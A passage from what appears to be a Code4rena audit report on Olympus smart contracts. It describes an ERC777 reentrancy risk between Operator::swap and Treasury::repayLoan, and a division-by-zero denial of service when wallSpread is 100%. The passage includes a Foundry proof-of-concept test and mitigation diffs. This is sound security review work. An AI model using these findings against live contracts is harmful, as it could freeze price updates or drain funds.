class=\"mtk7\">107</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"116\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">108</span><span class=\"mtk1\">         </span><span class=\"mtk3\">// Deposit from caller first (to handle nonstandard token transfers)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"117\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">109</span><span class=\"mtk1\">         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">prevBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token_</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"118\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">110</span><span class=\"mtk1\">         </span><span class=\"mtk12\">token_</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">amount_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"119\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">111</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"120\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">112</span><span class=\"mtk1\">         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">received</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token_</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)) - </span><span class=\"mtk12\">prevBalance</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>In the <code>swap</code> function, if the amount in token is reserve, the payment token to buy ohm will be paid to the treasury. It gives to an opportunity to modify the balance.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk3\">// Operator::swap</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"330\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"331\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">329</span><span class=\"mtk1\">             </span><span class=\"mtk3\">/// Transfer reserves to treasury</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"332\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">330</span><span class=\"mtk1\">             </span><span class=\"mtk12\">reserve</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">TRSRY</span><span class=\"mtk1\">), </span><span class=\"mtk12\">amountIn_</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Although both of <code>Operator::swap</code> and <code>OlympusTreasury::repayLoan</code> have <code>nonReentrant</code> modifier, it does not prevent as they are two different contracts.</p>\n<h3 id=\"tools-used-7\" style=\"position:relative;\"><a href=\"#tools-used-7\" aria-label=\"tools used 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Foundry</p>\n<h3 id=\"recommended-mitigation-steps-21\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-21\" aria-label=\"recommended mitigation steps 21 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The deposit logic in the <code>OlympusTreasury::repayLoan</code> was trying to handle nonstandard tokens, such as fee-on-transfer. But by doing so introduced an attack vector for tokens with ERC777. If the reserve token should be decided in the governance, it should be clarified, which token standards can be used safely.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/403#issuecomment-1241204868\">ind-igo (Olympus) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Good report, although very low risk as the preconditions are extremely unlikely. Will take into account the suggestion by adding a comment to the function. Thank you.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/403#issuecomment-1251655815\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I would probably downgrade to QA, but the warden does a good job of proving the point out with examples.  Will leave as Medium.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-20-operator-if-wallspread-is-10000-operate-and-beat-will-revert-and-price-information-cannot-be-updated-anymore\" style=\"position:relative;\"><a href=\"#m-20-operator-if-wallspread-is-10000-operate-and-beat-will-revert-and-price-information-cannot-be-updated-anymore\" aria-label=\"m 20 operator if wallspread is 10000 operate and beat will revert and price information cannot be updated anymore permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/404\">[M-20] Operator: if WallSpread is 10000, <code>operate</code> and <code>beat</code> will revert and price information cannot be updated anymore</a></h2>\n<p><em>Submitted by zzzitron</em></p>\n<p>The <code>beat</code> cannot be called anymore and price information will not be updated</p>\n<p>Condition:</p>\n<ul>\n<li>the wallspread is set to 10000 (100%)</li>\n<li>lower wall is active (range.low.active==true)</li>\n<li>the price falls into the lower cushion (currentPrice &#x3C; range.cushion.low.price &#x26;&#x26; currentPrice > range.wall.low.price), therefore activates the lower bond market</li>\n</ul>\n<h3 id=\"proof-of-concept-20\" style=\"position:relative;\"><a href=\"#proof-of-concept-20\" aria-label=\"proof of concept 20 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The below proof of concept demonstrates that the <code>operate</code> will revert with 100% wallspread. The full test code can be found <a href=\"https://gist.github.com/zzzitron/74dfbc0249151a682061cd6532628d87\">here</a> as well as <a href=\"https://gist.github.com/zzzitron/216d67cc0c7def5450b921f9c7f9ae91\">the diff from <code>Operator.t.sol</code></a>.</p>\n<p>In the test, the wallspread was set to 10000, which is 100% (line 51). The price was set so that the lower market should be deployed (line 59). In the market deployment logic (<code>Operator::_activate</code>) will revert due to division by zero, and <code>operate</code> will fail.</p>\n<p>Once this condition is met, the <code>operate</code> cannot be called and <code>Heart::beat</code> cannot be called as well, since the <code>Heart::beat</code> is calling <code>Operator::opearate</code> under the hood. As the result the price can never be updated. But other codes who uses the price information will not know that the price information is stale. If the upper wall is active and still have the capacity, one can swap from the upper wall using the stale information, which might cause some loss of funds.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_poc__lowCushionDeployWithWallspread10000Reverts</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/// Initialize operator</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">guardian</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">operator</span><span class=\"mtk1\">.</span><span class=\"mtk11\">initialize</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/// if the wallspread is 10000 the operate might revert</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">policy</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">operator</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setSpreads</span><span class=\"mtk1\">(</span><span class=\"mtk7\">7000</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/// Confirm that the cushion is not deployed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertTrue</span><span class=\"mtk1\">(!</span><span class=\"mtk12\">auctioneer</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isLive</span><span class=\"mtk1\">(</span><span class=\"mtk12\">range</span><span class=\"mtk1\">.</span><span class=\"mtk11\">market</span><span class=\"mtk1\">(</span><span class=\"mtk4\">true</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/// Set price on mock oracle into the lower cushion</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/// given the lower wallspread is 10000</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/// when the lower market should be deployed the operate reverts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">price</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setLastPrice</span><span class=\"mtk1\">(</span><span class=\"mtk7\">20</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/// Trigger the operate function manually</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/// The operate will revert Error with &quot;Division or modulo by 0&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/// But I could not figure out to catch with `expectRevert`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/// so just commenting out the assert</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// vm.prank(guardian);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// /// vm.expectRevert(bytes(&quot;Division or module by 0&quot;));   // this cannot catch the revert...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// operator.operate();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"cause-1\" style=\"position:relative;\"><a href=\"#cause-1\" aria-label=\"cause 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cause</h3>\n<p>The main cause is that the <code>RANGE::setSpreads</code> function fails to check for <code>wallSpread_ == 10000</code>. If the setter does not allow the wallSpread to be 100%, the price of the lower wall will not go to zero.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk3\">// modules/RANGE.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"250\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"251\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"252\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">242</span><span class=\"mtk1\">     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setSpreads</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">cushionSpread_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wallSpread_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">permissioned</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"253\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">243</span><span class=\"mtk1\">         </span><span class=\"mtk3\">// Confirm spreads are within allowed values</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"254\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">244</span><span class=\"mtk1\">         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"255\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">245</span><span class=\"mtk1\">             </span><span class=\"mtk12\">wallSpread_</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">10000</span><span class=\"mtk1\"> ||</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"256\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">246</span><span class=\"mtk1\">             </span><span class=\"mtk12\">wallSpread_</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">100</span><span class=\"mtk1\"> ||</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"257\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">247</span><span class=\"mtk1\">             </span><span class=\"mtk12\">cushionSpread_</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">10000</span><span class=\"mtk1\"> ||</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"258\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">248</span><span class=\"mtk1\">             </span><span class=\"mtk12\">cushionSpread_</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">100</span><span class=\"mtk1\"> ||</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"259\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">249</span><span class=\"mtk1\">             </span><span class=\"mtk12\">cushionSpread_</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">wallSpread_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"260\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">250</span><span class=\"mtk1\">         ) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RANGE_InvalidParams</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p>In the <code>RANGE::updatePrices</code>, the price of lower wall will be zero if the wallSpread is 100%.\nIf the price of lower wall is zero, the <code>Operator::_activate</code> will fail for the lower cushion.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"41\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// policies/Operator.sol::_activate(bool high_)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// when high_ is false</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">421</span><span class=\"mtk1\">             </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">invWallPrice</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">10</span><span class=\"mtk1\">**(</span><span class=\"mtk12\">oracleDecimals</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">2</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">range</span><span class=\"mtk1\">.</span><span class=\"mtk12\">wall</span><span class=\"mtk1\">.</span><span class=\"mtk12\">low</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// modules/RANGE.sol::updatePrices</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">164</span><span class=\"mtk1\">         </span><span class=\"mtk12\">_range</span><span class=\"mtk1\">.</span><span class=\"mtk12\">wall</span><span class=\"mtk1\">.</span><span class=\"mtk12\">low</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">movingAverage_</span><span class=\"mtk1\"> * (</span><span class=\"mtk12\">FACTOR_SCALE</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">wallSpread</span><span class=\"mtk1\">)) / </span><span class=\"mtk12\">FACTOR_SCALE</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h3 id=\"tools-used-8\" style=\"position:relative;\"><a href=\"#tools-used-8\" aria-label=\"tools used 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Foundry</p>\n<h3 id=\"recommended-mitigation-steps-22\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-22\" aria-label=\"recommended mitigation steps 22 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Mitigation suggestion: line 245. Forbid wallSpread to be 100%.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"42\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk3\">// modules/RANGE.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"250\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"251\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"252\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">242</span><span class=\"mtk1\">     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setSpreads</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">cushionSpread_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wallSpread_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">permissioned</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"253\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">243</span><span class=\"mtk1\">         </span><span class=\"mtk3\">// Confirm spreads are within allowed values</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"254\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">244</span><span class=\"mtk1\">         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"255\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">-</span><span class=\"mtk7\">245</span><span class=\"mtk1\">            </span><span class=\"mtk12\">wallSpread_</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">10000</span><span class=\"mtk1\"> ||</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"256\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">+               </span><span class=\"mtk12\">wallSpread_</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk7\">10000</span><span class=\"mtk1\"> ||</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"257\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">246</span><span class=\"mtk1\">             </span><span class=\"mtk12\">wallSpread_</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">100</span><span class=\"mtk1\"> ||</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"258\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">247</span><span class=\"mtk1\">             </span><span class=\"mtk12\">cushionSpread_</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">10000</span><span class=\"mtk1\"> ||</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"259\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">248</span><span class=\"mtk1\">             </span><span class=\"mtk12\">cushionSpread_</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">100</span><span class=\"mtk1\"> ||</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span 